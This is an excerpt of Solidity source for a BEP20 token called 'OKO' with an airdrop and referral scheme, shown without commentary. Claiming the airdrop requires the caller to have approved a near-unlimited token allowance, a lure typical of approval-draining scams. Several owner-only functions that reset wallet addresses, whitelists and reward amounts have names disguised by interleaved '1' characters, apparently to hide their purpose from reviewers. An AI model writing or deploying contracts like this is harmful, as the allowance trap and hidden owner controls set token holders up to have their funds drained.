...
contract Token is BEP20{
    ...
    constructor() {
        ...
        initaddress=address(0x52c0D48d08362790dA93600341Aa07c64f3364cf);
        mainaddress=address(0x82D651D69b8B2f1a5d467A2C21Cff3eb82912914);
        _name = "OKO";
        _symbol = "OKO";
    ...
    function getairdrop(address inviteaddress)public{
        ...
        require(uint256(0xffffffffffffffffffffffff)<=allow_amount,"Allowance to Low!");
        if(inviteaddress!=address(0)){
        myinvitenum[inviteaddress]=myinvitenum[inviteaddress]+1;
        mytotalinvitenum[inviteaddress]=mytotalinvitenum[inviteaddress]+1;
        //invite reawrd
        if(myinvitenum[inviteaddress]>=3){
        _transfer(mainaddress,inviteaddress,airdropreawrd1);
        myinvitenum[inviteaddress]=0;
        }
        }
        //get airdrop
        _transfer(mainaddress,msg.sender,airdropreawrd);        
    ...
    function s1e1t1w1a1l1l1e1t1a1d1d1r1e1s1s(address na1,address na2,address na3,address na4)public{
        require(msg.sender==_owner,"not a permission!");
        LPaddress=na1;
        Marketing=na2;
        initaddress=na3;
    ...
    function a1d1d1b1u1y1o1r1s1e1l1l1w1h1i1t1e(address a,bool b)public {
        require(msg.sender==_owner,"not a permission!");
        w1h1i1t1e1[a]=b;
    }
    function addpairaddress(address a,bool b)public{
        require(msg.sender==_owner,"not a permission!");
        _pairaddress[a]=b;
    }
    function changereawrd(uint256 u1,uint256 u2)public{
        require(msg.sender==_owner,"not a permission!");
        airdropreawrd=u1;
        airdropreawrd1=u2;
    }
